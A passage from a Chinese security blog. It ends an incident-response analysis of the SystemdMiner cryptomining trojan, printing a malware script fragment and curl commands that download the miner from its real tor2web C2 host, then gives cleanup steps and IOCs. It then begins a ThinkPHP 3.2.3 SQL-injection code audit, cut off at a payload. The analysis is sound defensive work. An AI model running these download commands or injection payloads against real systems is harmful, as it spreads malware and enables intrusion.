$t.tor2web.it</span><br></pre></td></tr></table></figure><p>这个脚本的作用是先将阿里云和腾讯云的入侵检测系统给卸载掉，然后再利用自动化运维工具写入定时任务，最后就是下载两个可执行文件，一个是<code>bot</code>，一个是<code>trc</code>，其中<code>trc</code>文件用于Hadoop Yarn未授权访问漏洞利用，bot大概率是该病毒的传播模块</p><ul><li><strong>下载挖矿文件cpu</strong></li></ul><p>病毒母体执行后会下载cpu脚本,以进行挖矿，手动下载一下试试看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in/cpu -o  cpu -e183.134.110.75</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/9670e0b20fb94fe38d45b5bff640fdb3.png" alt="在这里插入图片描述"></p><p>手动执行挖矿脚本的时候要先解除文件的锁定<code>chattr -i cpu</code>，再赋权限运行</p><p><img src="https://img-blog.csdnimg.cn/0f11bbae91994018bc0fd1976a2bbc97.png" alt="在这里插入图片描述"></p><p>但是在本地也没有运行起来，缺失一些配置文件，可能是因为前面的模块有的没有下载导致。</p><ul><li><strong>状态控制</strong></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">exec &amp;&gt;/dev/null</span><br><span class="line">export PATH=$PATH:$HOME:/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin</span><br><span class="line"></span><br><span class="line">d=$(grep x:$(id -u): /etc/passwd|cut -d: -f6)</span><br><span class="line">c=$(echo &quot;curl -4fsSLkA- -m200&quot;)</span><br><span class="line">t=$(echo &quot;i62hmnztfpzwrhjg34m6ruxem5oe36nulzmxcgbdbkiaceubprkta7ad&quot;)</span><br><span class="line"></span><br><span class="line">sockz() &#123;</span><br><span class="line">n=(doh.this.web.id doh.post-factum.tk dns.hostux.net uncensored.lux1.dns.nixnet.xyz dns.rubyfish.cn dns.twnic.tw doh-fi.blahdns.com fi.doh.dns.snopyta.org resolver-eu.lelux.fi doh.li dns.digitale-gesellschaft.ch)</span><br><span class="line">p=$(echo &quot;dns-query?name=relay.tor2socks.in&quot;)</span><br><span class="line">s=$($c https://$&#123;n[$((RANDOM%11))]&#125;/$p | grep -oE &quot;\b([0-9]&#123;1,3&#125;\.)&#123;3&#125;[0-9]&#123;1,3&#125;\b&quot; |tr &#x27; &#x27; &#x27;\n&#x27;|grep -Ev [.]0|sort -uR|head -n 1)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">u() &#123;</span><br><span class="line">sockz</span><br><span class="line">f=/cmd</span><br><span class="line"><span class="meta prompt_">$</span><span class="language-bash">c -x socks5h://<span class="variable">$s</span>:9050 <span class="variable">$t</span>.onion<span class="variable">$f</span> || <span class="variable">$c</span> $1<span class="variable">$f</span></span></span><br><span class="line">&#125;</span><br><span class="line">(</span><br><span class="line">u $t.tor</span><br></pre></td></tr></table></figure><p>病毒母体执行后会下载cmd脚本，用于当主机网络无法连接到矿池时，会结束掉自身的挖矿进程，增强隐蔽性，但是tor代理失效，暂时无法下载</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -4fsSLkA- -m200 fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in/cmd -o  cmd -e183.134.110.75</span><br></pre></td></tr></table></figure><p>如果用这种方法下载的话，很奇怪会得到下载ssh暴力破解的脚本，脚本内容也无法进行下载查看</p><p><img src="https://img-blog.csdnimg.cn/7bb9d555491145378b67d4d73a9075c4.png" alt="在这里插入图片描述"></p><h4 id="归纳梳理"><a href="#归纳梳理" class="headerlink" title="归纳梳理"></a>归纳梳理</h4><p>通过看师傅们的博客和自己的测试，对目前这个SystemedMiner挖矿木马也有了一定的了解，木马执行后，会下载一系列的模块和可执行脚本，用于持久化、内网横向渗透、挖矿、命令控制、清除一些入侵检测系统和其他挖矿程序，但需要使用tor代理，之所以服务器和虚拟机只有持久化的脚本(守护进程脚本)，就是因为病毒母体启动后，tor代理失效，无法下载其他模块和脚本，也就只有一个守护进程脚本。</p><h4 id="处置方法"><a href="#处置方法" class="headerlink" title="处置方法"></a>处置方法</h4><p>在了解了SystemedMiner挖矿木马感染机器的过程后，防护便一目了然了，它做的主机持久化控制便是通过写定时任务，而定时任务是下载病毒母体并执行，就这样循环来控制主机，所以要清除该病毒文件</p><ol><li>第一步便是要将定时任务删除完，通过<code>crontab -e</code>移除<code>/root/systemd-private-*</code>，然后再删除<code>/etc/cron.d/0systemd-private-* </code>和<code>/opt/systemd-private-*.sh</code>文件</li><li>再去查看<code>/tmp/.X11-unix/</code>文件下<code>01</code>、<code>11</code>获取其PID，使用<code>kill -9 进程id</code>，杀死进程</li><li>更改文件夹权限，再不清楚攻击者从哪里进来的时候，<code>/tmp/.X11-unix/</code>这个文件夹可以进行保留，防止黑客重新写入，但要设置好权限</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">chattr +i [file/directory]使file/directory无法被更动</span></span><br><span class="line">chattr +i /tmp/.X11-unix/01</span><br><span class="line">或</span><br><span class="line">chmod -R 000 /tmp/.X11-unix/01</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">查看文件夹权限</span></span><br><span class="line">ls -ld /tmp/.X11-unix/ </span><br></pre></td></tr></table></figure><p>4.若服务器中运行了其他的一些模块和脚本，杀相关进程和文件，重复上面的方法即可</p><h4 id="溯源分析"><a href="#溯源分析" class="headerlink" title="溯源分析"></a>溯源分析</h4><blockquote><p>该木马通过bash命令下载执行多个功能模块，通过SSH暴力破解、SSH免密登录利用、Hadoop Yarn未授权访问漏洞和自动化运维工具内网扩散，且该木马的文件下载均利用暗网代理，感染后会清除主机上的其他挖矿木马，以达到资源独占的目的</p></blockquote><p><img src="https://img-blog.csdnimg.cn/3cbc5c9643b345919be602721e0c181d.png" alt="在这里插入图片描述"></p><p>看了很多类似挖矿木马的文章，黑客入口都指向Hadoop Yarn未授权访问或是SSH爆破密码，既然内网的主机全被感染了，逐一来排查一下</p><h5 id="Hadoop-yarn-未授权访问漏洞"><a href="#Hadoop-yarn-未授权访问漏洞" class="headerlink" title="Hadoop-yarn-未授权访问漏洞"></a>Hadoop-yarn-未授权访问漏洞</h5><ul><li>影响版本：3.3.0 以下、</li><li>通过REST API创建并提交任务，YARN执行任务，下载执行恶意sh脚本</li></ul><p>先看一下当前服务器的Hadoop版本，版本在3.3.0以下，有未授权访问的风险</p><p><img src="https://img-blog.csdnimg.cn/1fd6fa3dce8542bb8616eb3f0eba6135.png" alt="在这里插入图片描述"></p><p>可以查看下有关yarn的进程，看看有没有挖矿程序</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ps -ef | grep yarn</span><br></pre></td></tr></table></figure><p>查看了几天被感染的服务器都未发现相关信息，只能去排查一下YARN日志，看看是否有异常的<code>application</code>，204的主机曾关闭过防火墙，优先去排查一下204这台主机</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">yarn application -list -appStates ALL #不显示时间信息</span><br><span class="line">yarn logs -applicationId application_1647720164720_1130</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">匹配关键字</span></span><br><span class="line">yarn application -list -appStates ALL | grep curl</span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/27b9c95e13f5422ab7dee0bb8a6e502d.png" alt="在这里插入图片描述"></p><p>也没有发现什么线索。</p><p>既然在服务器上都没有下载出相应的控制、挖矿文件或模块，说明代理失效，那ssh模块也应该是无法下载的，猜测可能是自动化运维工具写入，但服务器上没有这一类工具，只能说明是利用SSH免密码登录进去的，这个病毒母体恰好有这个功能，恰好服务器也是有这个免登的功能，<strong>所以初步推断内网横向感染的原因就是因为免密码登录</strong></p><p>SSH暴力破解进入其他内网主机应该不太现实，因为都是强口令，不容易被爆破出来的，而且公司服务器都有防护，如果大量爆破发包的话也会产生警告，因此这样也可以排除是SSH爆破进入服务器的。</p><p>目前暂不能判断攻击者是从哪里进来的，只能先进行处置，保留病毒文件夹，修改权限，以防下次再写入</p><h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul><li>建议将免登取消掉，以防某一台感染后横向传染其他服务器</li></ul><h4 id="IOCS"><a href="#IOCS" class="headerlink" title="IOCS"></a>IOCS</h4><p>守护进程样本hash：<br>MD5 <code>d61b3ba654ad546cc49d5ace7de0e309</code><br>SHA-1 <code>ca852b6b7f5e52a17661456ae37e0e6009c87ac3</code><br>SHA-256 <code>7de2aa89cb2f2edf06418ad39d6c516c25bb52a5d1bf62332b0892bc2fa1c3d4</code></p><p>远控样本(int.x86_64)hash：<br>MD5 <code>7308d194a75c13e464d4a8cc8094bca7</code><br>SHA-1 <code>389889090811fb2a4063d03c0ecafb33b8c68b12</code><br>SHA-256 <code>7834430c0d7953648e906a679ae6e92d6807305220639df41bff72dceb09e94f</code></p><p><code>fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.onion</code><br><code>fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.it</code> ——C&amp;C域名<br><code>fjuoqusekcob5av5rww3nxgscdrq5dgm7w535qe2ekudln4azyzqkzad.tor2web.in</code> ——C&amp;C域名</p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h4><p><a href="https://www.freebuf.com/articles/system/233138.html">https://www.freebuf.com/articles/system/233138.html</a></p><p><a href="https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=144683">https://bbs.sangfor.com.cn/forum.php?mod=viewthread&amp;tid=144683</a></p><p><a href="https://www.freebuf.com/articles/system/225146.html">https://www.freebuf.com/articles/system/225146.html</a></p><p><a href="https://hksanduo.github.io/2021/11/08/2021-11-08-systemd-miner-analysis/">https://hksanduo.github.io/2021/11/08/2021-11-08-systemd-miner-analysis/</a></p><p><a href="https://www.freebuf.com/articles/web/279000.html">https://www.freebuf.com/articles/web/279000.html</a></p><p><a href="https://zhuanlan.zhihu.com/p/370493577">https://zhuanlan.zhihu.com/p/370493577</a></p><p><a href="https://www.codenong.com/cs106872151/cl">https://www.codenong.com/cs106872151/cl</a></p><p><a href="http://les1ie.com/2021/07/12/tor-miner/">http://les1ie.com/2021/07/12/tor-miner/</a></p><p><a href="https://github.com/tor2web/Tor2web">https://github.com/tor2web/Tor2web</a></p><p><a href="https://zhuanlan.kanxue.com/article-10818.htm">https://zhuanlan.kanxue.com/article-10818.htm</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 应急响应 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Thinkphp3.2.3-[代码审计]</title>
      <link href="/2019/05/03/Thinkphp3.2.3-%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D/"/>
      <url>/2019/05/03/Thinkphp3.2.3-%5B%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%5D/</url>
      
        <content type="html"><![CDATA[<h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><h3 id="0x00-为什么要使用框架"><a href="#0x00-为什么要使用框架" class="headerlink" title="0x00:为什么要使用框架"></a>0x00:为什么要使用框架</h3><blockquote><p>使用框架相当于别人已经帮助完成一些基础工作，开发者只需要集中精力在系统的业务逻辑设计上即可。而且相较于原生代码开发更稳定、安全、易扩展。</p></blockquote><h3 id="0x01-TP3-2-3程序目录结构"><a href="#0x01-TP3-2-3程序目录结构" class="headerlink" title="0x01:TP3.2.3程序目录结构"></a>0x01:TP3.2.3程序目录结构</h3><ul><li>入口文件（应用对外提供的接口）</li><li>核心框架目录</li><li>模块集合（<code>Common</code>模块优先于其他模块执行）</li><li>缓存目录（<code>./Application/Runtime</code>）</li><li>公共资源目录（<code>./Public</code>）</li></ul><p>更详细的可以看官方手册上描述的：</p><p>@<a href="http://document.thinkphp.cn/manual_3_2.html#directory_structure">http://document.thinkphp.cn/manual_3_2.html#directory_structure</a></p><h3 id="0x02-MVC分层架构"><a href="#0x02-MVC分层架构" class="headerlink" title="0x02:MVC分层架构"></a>0x02:MVC分层架构</h3><ul><li>控制器（<code>Controller</code>）：负责用户请求的调度和处理业务逻辑</li><li>模型（<code>Model</code>）：负责业务数据的处理和与数据库的交互</li><li>视图（<code>View</code>）：提供了展示数据的各种方式</li></ul><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008785.png" alt="请添加图片描述"></p><h3 id="0x03-模板渲染-amp-入口绑定"><a href="#0x03-模板渲染-amp-入口绑定" class="headerlink" title="0x03:模板渲染&amp;入口绑定"></a>0x03:模板渲染&amp;入口绑定</h3><p>在TP3.2.3模板中先建立一个Admin文件夹，内容及文件夹名称Copy前端文件夹Home即可</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008212.png" alt="请添加图片描述"></p><p>如果想要更改默认首页内容，在<code>Application\Admin\Controller\IndexController.class.php</code> （<strong>控制器</strong>）进行修改</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008999.png" alt="在这里插入图片描述"></p><p>在开发时一般后台所使用的Public文件夹是独立开的，因此这里后台也就需要更改一下默认的Public文件夹，需要先在应用入口文件中定义应用目录</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008679.png" alt="在这里插入图片描述"></p><p>然后在<code>Admin\Conf\config.php</code>处进行配置</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008603.png" alt="在这里插入图片描述"></p><p>最后将<code>JS/CSS/HTML</code> （<strong>视图</strong>）文件进行引入，修改路径即可成功访问</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008890.png" alt="在这里插入图片描述"></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008817.png" alt="在这里插入图片描述"></p><p>除此之外，还是有很多知识是没有接触到的，上面控制器中代码有<strong>M，D，U，I</strong>这些方法，具体功能参考大师傅的文章：</p><p>@<a href="https://www.cnblogs.com/kenshinobiy/p/9165662.html">https://www.cnblogs.com/kenshinobiy/p/9165662.html</a></p><p>代码则位于<code>Thinkphp/Common/functions.php</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008892.png" alt="请添加图片描述"></p><p>例如 <code>I</code>方法主要用于更加方便和安全的获取系统输入变量，用法如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">I</span>(<span class="string">&#x27;get.id&#x27;</span>); &lt;==&gt; <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>]</span><br><span class="line"><span class="title function_ invoke__">I</span>(<span class="string">&#x27;id&#x27;</span>); &lt;==&gt; <span class="title function_ invoke__">I</span>(<span class="string">&#x27;param.id&#x27;</span>) </span><br><span class="line">param自动判断请求类型获取GET、POST或者PUT参数</span><br></pre></td></tr></table></figure><p>其他函数的用法看手册即可</p><h3 id="0x04-TP3路由格式："><a href="#0x04-TP3路由格式：" class="headerlink" title="0x04:TP3路由格式："></a>0x04:TP3路由格式：</h3><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040008353.png" alt="请添加图片描述"></p><p>这里通过一个简单的例子来了解常用的四种路由模式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;hello &quot;</span>.<span class="variable">$name</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>普通模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php?m=Home&amp;c=Index&amp;f=index&amp;name=Sn0w</span></span><br><span class="line">http:<span class="comment">//网址/index.php?m=模块名称&amp;c=控制器&amp;a=方法</span></span><br></pre></td></tr></table></figure><p><strong>兼容模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php?s=Home/Index/index/name/Sn0w</span></span><br><span class="line">http:<span class="comment">//网址/index.php?s=/模块/控制器/方法</span></span><br></pre></td></tr></table></figure><p><strong>REWRITE模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/Home/Index/index/name/Sn0w/</span></span><br><span class="line">http:<span class="comment">//网址/模块/控制器/操作方法</span></span><br></pre></td></tr></table></figure><p><strong>PATHINFO模式：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/index.php/Home/Index/index/name/Sn0w/</span></span><br><span class="line">http:<span class="comment">//网址/index.php/模块/控制器/操作方法</span></span><br></pre></td></tr></table></figure><p>最终呈现的效果都一样：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009021.png" alt="在这里插入图片描述"></p><h2 id="TP3-2-3-SQL注入"><a href="#TP3-2-3-SQL注入" class="headerlink" title="TP3.2.3 SQL注入"></a>TP3.2.3 SQL注入</h2><h3 id="环境搭建："><a href="#环境搭建：" class="headerlink" title="环境搭建："></a>环境搭建：</h3><p>先去官网上下载一份TP3.2.3源码，再创建一个数据库<code>thinkphp</code>和数据表<code>users</code></p><p>@<a href="https://www.thinkphp.cn/Down">https://www.thinkphp.cn/Down</a></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009886.png" alt="请添加图片描述"></p><p>添加好数据后，将数据库配置设置好</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009205.png" alt="请添加图片描述"></p><p>访问一下<code>Application</code>目录下便会自动生成目录结构，接下来将控制器给配置好</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Application/Home/Controller/IndexController.<span class="keyword">class</span>.php</span><br><span class="line"><span class="comment">#更改内容为:</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Home</span>\<span class="title class_">Controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">Think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">IndexController</span> <span class="keyword">extends</span> <span class="title">Controller</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">shy</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$data</span> = <span class="title function_ invoke__">M</span>(<span class="string">&#x27;users&#x27;</span>)-&gt;<span class="title function_ invoke__">find</span>(<span class="title function_ invoke__">I</span>(<span class="string">&#x27;GET.id&#x27;</span>));</span><br><span class="line">        <span class="title function_ invoke__">dump</span>(<span class="variable">$data</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>测试一下效果：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009696.png" alt="在这里插入图片描述"></p><p>下断点，至于如何设置<code>PHPstorm</code>调试的可以参考如下文章：</p><p>@<a href="https://blog.csdn.net/Xxy605/article/details/120973447">https://blog.csdn.net/Xxy605/article/details/120973447</a></p><p>接下来就输入正常的SQL测试语句<code>?id=1&#39; or 1=1%23</code> ，看一下传入的参数所走的流程：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009110.png" alt="在这里插入图片描述"></p><p><code>M</code>方法先实例化一个数据库操作对象，F8跳过此方法到<code>I</code>方法中，不影响传入参数的代码就不再叙述，默认的filter是<code>htmlspecialchars()</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009456.png" alt="在这里插入图片描述"></p><p>先经过<code>htmlspecialchars()</code> 的处理，此函数默认是不转义单引号的，之后再回调<code>think_filter</code>函数进行过滤</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009760.png" alt="在这里插入图片描述"></p><p>跟踪一下这个函数，是黑名单过滤，看都过滤了哪些字符</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009044.png" alt="在这里插入图片描述"></p><p>最终参数输出为</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009110.png" alt="在这里插入图片描述"></p><p><code>I</code>方法结束后，便会进入到<code>find</code>方法中去，这个方法作用是查询数据，F7跟着代码走一下，到分析表达式这块，这里调用了<code>_parseOptions()</code> 这个函数</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009435.png" alt="在这里插入图片描述"></p><p>此时id还是之前传入的<code>1&#39; or 1=1#</code> ，跟进这个函数看做了什么处理，如下图进入字段类型验证这段代码</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009660.png" alt="在这里插入图片描述"></p><p>又有一个<code>_parseType</code> 函数对我们传入的参数（即<code>$options[&#39;where&#39;]</code>）进行处理，此时id依旧是我们传入的，跟进这个函数继续看</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009758.png" alt="在这里插入图片描述"></p><p>这里的代码把我们传入的id进行了强制类型转换，使用了<code>intval</code>这个函数，到这一步我们传入的参数就变成了1，然后再返回给<code>_parseOptions()</code> 这个函数，再进行查询便不会出现SQL注入</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009923.png" alt="请添加图片描述"></p><p>梳理一下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; or 1=1# -&gt; M() -&gt; find() -&gt; _parseOptions() -&gt; _parseType()</span></span><br></pre></td></tr></table></figure><p>传入的参数便是在<code>_parseType()</code> 这个函数处被处理了，但具体是怎么处理的还是没搞清楚，因为前面创建数据库<code>id</code>列使用的是<code>int</code> 类型，所以到<code>intval</code>这个函数就会直接被处理，所以将<code>id</code>列改为<code>varchar</code>，F7继续跟进</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009571.png" alt="在这里插入图片描述"></p><p>进入<code>buildSelectSql</code> 这个函数前，传入的参数还是正常的，跟进这个函数，进入到<code>parseSql</code> 函数，作用是对原初的SQL语句进行替换，构造的<code>id</code>在<code>where</code>那里，跟进一下<code>parseWhere()</code></p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009902.png" alt="在这里插入图片描述"></p><p>跟进到此，又发现调用了两个函数，此时传入的还是之前的 </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009044.png" alt="在这里插入图片描述"></p><p>跟进<code>parseWhereItem</code> 这个函数，发现到这一步又调用了<code>parseValue</code> </p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009949.png" alt="在这里插入图片描述"></p><p>进行跟进看一下这个函数对传入的参数进行了什么处理</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">     * value分析</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@access</span> protected</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> mixed $value</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">parseValue</span>(<span class="params"><span class="variable">$value</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="title function_ invoke__">strpos</span>(<span class="variable">$value</span>,<span class="string">&#x27;:&#x27;</span>) === <span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">in_array</span>(<span class="variable">$value</span>,<span class="title function_ invoke__">array_keys</span>(<span class="variable">$this</span>-&gt;bind))? <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>) : <span class="string">&#x27;\&#x27;&#x27;</span>.<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>).<span class="string">&#x27;\&#x27;&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="keyword">isset</span>(<span class="variable">$value</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$value</span>[<span class="number">0</span>]) &amp;&amp; <span class="title function_ invoke__">strtolower</span>(<span class="variable">$value</span>[<span class="number">0</span>]) == <span class="string">&#x27;exp&#x27;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">escapeString</span>(<span class="variable">$value</span>[<span class="number">1</span>]);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$value</span>)) &#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="title function_ invoke__">array_map</span>(<span class="keyword">array</span>(<span class="variable">$this</span>, <span class="string">&#x27;parseValue&#x27;</span>),<span class="variable">$value</span>);</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_bool</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="variable">$value</span> ? <span class="string">&#x27;1&#x27;</span> : <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">        &#125;<span class="keyword">elseif</span>(<span class="title function_ invoke__">is_null</span>(<span class="variable">$value</span>))&#123;</span><br><span class="line">            <span class="variable">$value</span> =  <span class="string">&#x27;null&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$value</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>那这就很明显了，第一个if条件判断成功，进入<code>escapeString</code> 函数，使用<code>addslashes()</code> 转义传入的单引号，后面就无需再跟进了就是拼接SQL语句</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009451.png" alt="在这里插入图片描述"></p><p>但代码中还有很多判断数组的代码，因此就要考虑一下<code>id</code>传数组，再跟进代码看一下是否存在SQL注入,最后用一张图来总结便是：</p><p><img src="https://sn0w.oss-cn-shenzhen.aliyuncs.com/img/202304040009824.png" alt="在这里插入图片描述"></p><h3 id="Thinkphp3-2-3-where注入"><a href="#Thinkphp3-2-3-where注入" class="headerlink" title="Thinkphp3.2.3 where注入"></a>Thinkphp3.2.3 where注入</h3><p><strong>Payload：</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">thinkphp_3.<span class="number">2.3</span>/index.php/home/index/shy?id[where]=<span class="number">1</span> 